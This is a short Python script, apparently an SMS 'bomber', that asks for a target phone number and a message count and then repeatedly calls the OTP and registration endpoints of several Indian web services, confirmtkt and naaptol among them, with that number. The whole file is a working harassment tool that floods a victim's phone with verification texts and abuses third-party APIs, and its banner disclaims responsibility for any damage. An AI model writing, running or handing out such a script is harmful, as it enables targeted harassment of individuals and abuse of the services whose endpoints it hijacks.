from urllib.request import Request,urlopen
from urllib.parse import urlencode,quote_plus
import platform
import os
import time
import urllib
import urllib.request
import http.cookiejar

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""8b        d8                                                                                                
 Y8,    ,8P                                                                                                 
  Y8,  ,8P                                                                                                  
   "8aa8"  ,adPPYba,   88       88  8b,dPPYba,     8b,dPPYba,   ,adPPYYba,  88,dPYba,,adPYba,    ,adPPYba,  
    `88'  a8"     "8a  88       88  88P'   "Y8     88P'   `"8a  ""     `Y8  88P'   "88"    "8a  a8P_____88  
     88   8b       d8  88       88  88             88       88  ,adPPPPP88  88      88      88  8PP"""""""  
     88   "8a,   ,a8"  "8a,   ,a88  88             88       88  88,    ,88  88      88      88  "8b,   ,aa  
     88    `"YbbdP"'    `"YbbdP'Y8  88             88       88  `"8bbdP"Y8  88      88      88   `"Ybbd8"'
                                                                                                                                                                                                    
                                   By : Your name   
                                With <3 of T34M GCA                                                                                                  
    Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")
#http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#http://www.quikr.com/SignIn?aj=1&for=send_otp&user=

def send(num, counter, slep):
    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="]
    #url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
    data={"phone":num}
    x=y=0
    for y in range(int(counter)):
        for x in url1:
            banner()
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url=str(x)+num
            resp1=Request(result_url)
            urlopen(resp1)
            time.sleep(slep)        

banner()
send(input("Enter Target Number : "), input("Enter Number of Messages : "), 1)
